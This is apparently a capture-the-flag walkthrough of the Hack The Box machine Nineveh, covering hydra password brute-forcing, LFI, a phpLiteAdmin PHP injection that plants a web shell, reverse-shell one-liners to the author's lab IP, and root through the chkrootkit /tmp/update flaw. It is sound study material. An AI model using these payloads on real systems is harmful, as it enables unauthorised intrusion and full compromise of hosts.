---
tags:
  - chkrootkit
  - knockd
  - phpliteadmin
  - lfi
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/923486e3c3741f202be2cb923a9028dc.png)

- Machine : https://app.hackthebox.com/machines/Nineveh
- Reference : https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
- Solved : 2025.2.24. (Mon) (Takes 1day)

## Summary
---

1. **Initial Enumeration**
    - **Open Ports**: HTTP (80), HTTPS (443).
    - **Identified Domain**: `nineveh.htb`
    - **Discovered Services**:
        - Apache HTTP Server 2.4.18 (Ubuntu)
        - SSL certificate with `nineveh.htb`
    - **Gobuster Scan**:
        - Found `/department` and `/db` directories.
        - Exposed a possible user: `amrois` (from HTML comment).
        
2. **Web Exploitation**
    - **Brute-force Attack on Login Page**:
        - Used `hydra` to crack `admin` credentials (`1q2w3e4r5t`).
        - Found a note mentioning a **"secret folder"** and possible **hard-coded passwords**.
    - **Local File Inclusion (LFI)**:
        - Identified LFI vulnerability in `/department/manage.php?notes=`.
        - Used LFI to leak system files (e.g., `/etc/passwd`).
    - **PHPLiteAdmin v1.9 (Authenticated PHP Code Execution)**:
        - Used `hydra` again to brute-force `db` login (`admin:password123`).
        - Exploited PHP Code Injection to create a **web shell** (`cmd.php`).
        - Used the web shell to execute a **reverse shell**.
        
3. **Shell as `www-data`**
    - **Checked Local Services**:
        - Found **SSH (22) only accessible locally**.
    - **Found RSA Key for `amrois`**:
        - Extracted the key from **hidden data in `nineveh.png`**.
        - Used the key to SSH into `localhost` as `amrois`.
        
4. **Shell as `amrois`**
    - **Knockd Port Knocking**:
        - Discovered `knockd` service in `/etc/knockd.conf`.
        - Used the sequence **571-290-911** to open SSH externally.
        - Logged in via SSH using the **previously found private key**.
        
5. **Privilege Escalation to `root`**
    - **Chkrootkit Exploit**:
        - Found `chkrootkit` running as root via `pspy64`.
        - Exploited the `update` binary execution vulnerability.
        - Created a malicious `/tmp/update` script to gain **root shell**.

### Key Techniques:

- **Brute-force Attacks**: Used `hydra` to crack credentials.
- **LFI Exploitation**: Leveraged directory traversal to access sensitive files.
- **Web Shell Execution**: Exploited PHPLiteAdmin to execute arbitrary PHP code.
- **Port Knocking**: Used `knock` to open SSH externally.
- **Privileged Task Exploitation**: Exploited `chkrootkit` to escalate privileges to `root`.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.43
Performing quick port scan on 10.10.10.43...
Found open ports: 80,443
Performing detailed scan on 10.10.10.43...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 02:01 MST
Nmap scan report for 10.10.10.43
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.09 seconds
```

Only web services ports are open : http(80), https(443)
Also, there's a domain name exposed : nineveh.htb

### http(80)

![](attachments/nineveh_1.png)

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 290]
/info.php             (Status: 200) [Size: 83683]
/department           (Status: 301) [Size: 315] [--> http://nineveh.htb/department/]
```

![](attachments/nineveh_3.png)

On its source code, I found this comment.
`<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->`
There might be a user `amrois`, and mysql is running.

![](attachments/nineveh_5.png)

I observed the response, and found out that the username `admin` exists, given the error message "Invalid Password!", while non-existing username returns "Invalid Username!".

Let's try brute-force using `hydra`.

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid Password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-24 05:45:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:F=Invalid Password
[STATUS] 869.00 tries/min, 869 tries in 00:01h, 14343530 to do in 275:06h, 16 active
[STATUS] 833.67 tries/min, 2501 tries in 00:03h, 14341898 to do in 286:44h, 16 active
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-24 05:51:02
```

The found password for `admin` is `1q2w3e4r5t`.

After sign-in, on "Notes" tab, I can find the following message from `amrois` :

![](attachments/nineveh_7.png)

It talks about several features :
- Hard-coded password? Maybe the one that I used to sign-in,  but it was not hard-coded as long as I know.
- Secret folder? There might be a hidden page.
- Not sure if the DB interface is the key.

Also, I focused on its URL : 
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt

I guessed that this might be vulnerable to LFI, and my guess was correct!

![](attachments/nineveh_9.png)

To be specific, I played around this vulnerability, and realized that I need at least 7 `../` to get to the root directory.

Here is an example :
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../etc/passwd

Plus, it exposes http(80) service's webroot : `/var/www/html/department/`

![](attachments/nineveh_14.png)

### https(443)

![](attachments/nineveh_2.png)

```bash
┌──(kali㉿kali)-[~/htb/nineveh]
└─$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -k -t 20 --timeout 20s
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 20s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 291]
/db                   (Status: 301) [Size: 309] [--> https://nineveh.htb/db/]
/.php                 (Status: 403) [Size: 291]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://nineveh.htb/secure_notes/]  
```

![](attachments/nineveh_16.png)

The image looks suspicious. Let's investigate more.

```bash
┌──(kali㉿kali)-[~/htb/nineveh]
└─$ exiftool nineveh.png 
ExifTool Version Number         : 13.00
File Name                       : nineveh.png
Directory                       : .
File Size                       : 2.9 MB
File Modification Date/Time     : 2025:02:24 10:46:38-07:00
File Access Date/Time           : 2025:02:24 10:46:38-07:00
File Inode Change Date/Time     : 2025:02:24 10:46:38-07:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1497
Image Height                    : 746
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 1497x746
Megapixels                      : 1.1
```

The info doesn't looks special.

```bash
┌──(kali㉿kali)-[~/htb/nineveh]
└─$ strings nineveh.png

<SNIP>

www-data
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

Bingo! It stores RSA keys for `amrois`!
But there's no use for now since ssh(22) port is not open.
Let's save this credential for now.

![](attachments/nineveh_4.png)

There are several exploits for "phpLiteAdmin v1.9", but it seems that all requires authentication.
Let's try brute-forcing again.

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-24 06:27:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password
[STATUS] 467.00 tries/min, 467 tries in 00:01h, 14343932 to do in 511:56h, 16 active
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-24 06:29:54
```

The password found here is `password123`.
Let's try sign-in with this credential.

![](attachments/nineveh_6.png)



# Shell as `www-data`
### PHPLiteAdmin v1.9 PHP Code Injection

At this moment, I googled to find if there's any authenticated vulnerabilities, and found one PHP Code Injection exploit on "phpLiteAdmin v1.9" : https://www.exploit-db.com/exploits/24044

Let's create a new database.

![](attachments/nineveh_8.png)

Then, create a table.

![](attachments/nineveh_10.png)

On the `Default value` field, put PHP code, and set the type as `TEXT`.
Here is the full payload : 
`<?php $sock=fsockopen("10.10.14.36",9000);system("/bin/sh -i <&3 >&3 2>&3"); ?>`

![](attachments/nineveh_11.png)

Then, it's created.

![](attachments/nineveh_12.png)

![](attachments/nineveh_13.png)

Given the `Path to database`, I think I need to fetch `/var/tmp/rshell.php`.
I can use **LFI Vulnerability found on http(80) service**.

...

I tested to open a reverse shell, but it didn't work.
Instead, `cmd.php` payload worked : `<?php system($_REQUEST["cmd"]); ?>`

![](attachments/nineveh_15.png)

Through the URL parameter, I can still open a reverse shell with the following command :

```perl
┌──(kali㉿kali)-[~]
└─$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 9000 >/tmp/f' | jq -sRr @uri
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.36%209000%20%3E%2Ftmp%2Ff%0A
```

Then I was able to open a reverse shell.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.43] 60822
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```



# Shell as `amrois`

### ssh connection

```bash
www-data@nineveh:/var/www/html$ ss -lntp
ss -lntp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128          *:80                       *:*                  
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      128          *:443                      *:*                  
LISTEN     0      128         :::22                      :::* 
```

ssh(22) port is open locally.

Using the previously found SSH private key for `amrois`, I can open a ssh shell.

```bash
www-data@nineveh:/tmp$ chmod 600 amrois.priv
chmod 600 amrois.priv
www-data@nineveh:/tmp$ ssh -i amrois.priv amrois@localhost
ssh -i amrois.priv amrois@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```

### (Alternative) Knockd

There's `knockd` running by `root`.

```bash
root      1308     1  0 02:38 ?        00:02:11 /usr/sbin/knockd -d -i ens160
```

The knocking order is specified in /etc/knockd.conf.

```bash
amrois@nineveh:~$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

It says 571-290-911 should be knocked in order to open SSH service.

```bash
┌──(kali㉿kali)-[~]
└─$ knock -v 10.10.10.43 571 290 911 
hitting tcp 10.10.10.43:571 
hitting tcp 10.10.10.43:290 
hitting tcp 10.10.10.43:911

┌──(kali㉿kali)-[~]
└─$ ssh -i nineveh.priv amrois@10.10.10.43 
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established. ED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI. This key is not known by any other names. 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.43' (ED25519) to the list of known hosts. Ubuntu 16.04.2 LTS 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) 

* Documentation: https://help.ubuntu.com 
* Management: https://landscape.canonical.com 
* Support: https://ubuntu.com/advantage 

288 packages can be updated. 
207 updates are security updates. 

You have mail. 
Last login: Mon Jul 3 00:19:59 2017 from 192.168.0.14 
amrois@nineveh:~$ whoami amrois 
amrois@nineveh:~$ id uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```



# Shell as `root`

### Enumeration

Let's run `LinPEAS`.

```bash
╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                    
/home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin



╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                      
/usr/bin/crontab                                                             
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * 



╔══════════╣ Users with console
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash                                
root:x:0:0:root:/root:/bin/bash




╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                     

You own the script: /usr/sbin/report-reset.sh                                
/usr/bin/gettext.sh

```

It seems that `/usr/sbin/report-reset.sh` is run regularily.
Let's run `pspy64` to check more.

```ruby
amrois@nineveh:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

<SNIP>
2025/02/24 12:13:02 CMD: UID=0     PID=7693   | chown amrois:amrois /report/report-25-02-24:12:13.txt    
<SNIP>
2025/02/24 12:16:02 CMD: UID=0     PID=10367  | /bin/sh /usr/bin/chkrootkit 
2025/02/24 12:16:02 CMD: UID=0     PID=10366  | /bin/sh /usr/bin/chkrootkit 
2025/02/24 12:16:02 CMD: UID=0     PID=10365  | /bin/sh /usr/bin/chkrootkit 
2025/02/24 12:16:02 CMD: UID=0     PID=10370  | /bin/sh /usr/bin/chkrootkit 
2025/02/24 12:16:02 CMD: UID=0     PID=10369  | /bin/sh /usr/bin/chkrootkit 
2025/02/24 12:16:02 CMD: UID=0     PID=10368  | /bin/sh /usr/bin/chkrootkit 
<SNIP>
```

I can see that `/chrootkit` keeps running, and something happens on `/report` directory.

```bash
amrois@nineveh:/report$ cat report-25-02-24\:12\:20.txt 
ROOTDIR is `/'                                                               
Checking `amd'... not found                                                  
Checking `basename'... not infected
Checking `biff'... not found
<SNIP>
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
<SNIP>
Searching for suspect PHP files... 
/var/tmp/rshell.php
/var/tmp/hack.php
/var/tmp/cmd.php

Searching for anomalies in shell history files... Warning: `//root/.bash_history' is linked to another file
Checking `asp'... not infected
<SNIP>
Checking `OSX_RSPLUG'... not infected
```

### Exploit `chkrootkit`

Here I found privilege escalation exploits.

```bash
searchsploit chkrootkit
---------------------------------------------------- ----------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/)
---------------------------------------------------- ----------------------------
Chkrootkit - Local Privilege Escalation.            | exploits/linux/local/38775.
Chkrootkit 0.49 - Local Privilege Escalation        | exploits/linux/local/33899.
---------------------------------------------------- ----------------------------
Shellcodes: No Result
```

Here's the explanation of the exploit.

```
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
```

Let's reproduce it.

```bash
amrois@nineveh:/report$ cat /tmp/update
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 9001 >/tmp/f



amrois@nineveh:/report$ ls -al /tmp/update
-rwxrwxr-x 1 amrois amrois 92 Feb 24 12:29 /tmp/update
```

Then soon, listener spawns a `root` shell.

```bash
┌──(kali㉿kali)-[~/htb/nineveh]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.43] 33796
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```
